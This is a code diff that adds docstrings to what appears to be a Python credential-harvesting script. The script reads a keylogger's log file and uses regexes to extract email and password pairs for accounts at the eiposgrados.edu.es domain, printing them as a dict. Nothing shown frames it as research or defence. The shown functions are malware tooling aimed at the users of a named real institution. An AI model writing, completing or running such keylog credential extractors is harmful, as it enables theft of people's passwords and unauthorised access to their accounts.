@@ -5,6 +5,11 @@ import re
 
 
 def detectEIPassword():
+    """
+    detectEIPassword
+        Function to confirm the potential presence of a pair (email, password)
+        \n\tIt prints a dict of found credentials.
+    """
     file = open(KEYLOG_FILE, 'r')
     potentialCredentials = []
     for line in file:
@@ -21,10 +26,14 @@ def detectEIPassword():
     else:
         print('Could not find @eiposgrados.edu.es email on the logs.')
 
-'''
-    Extract Credentials.
-'''
+
 def extractCredentials(potentialCredentials) -> dict:
+    """
+        extractCredentials
+            Function to extract a pair of (email, password) from a line containing a potential match.
+            :param potentialCredentials: str line containing a match for an @eiposgrados.edu.es email.
+            :return: dict with key the matched email and value the password string
+    """
     EMAIL_REGEX = r'([a-zA-Z][a-zA-Z0-9_.+-]+)@eiposgrados.edu.es'
     PASSWORD_REGEX = r'([a-zA-Z][a-zA-Z0-9_.+-]+)@eiposgrados.edu.es(\s+)([a-zA-Z][a-zA-Z0-9_.+-]+)+'
     credentials = {}
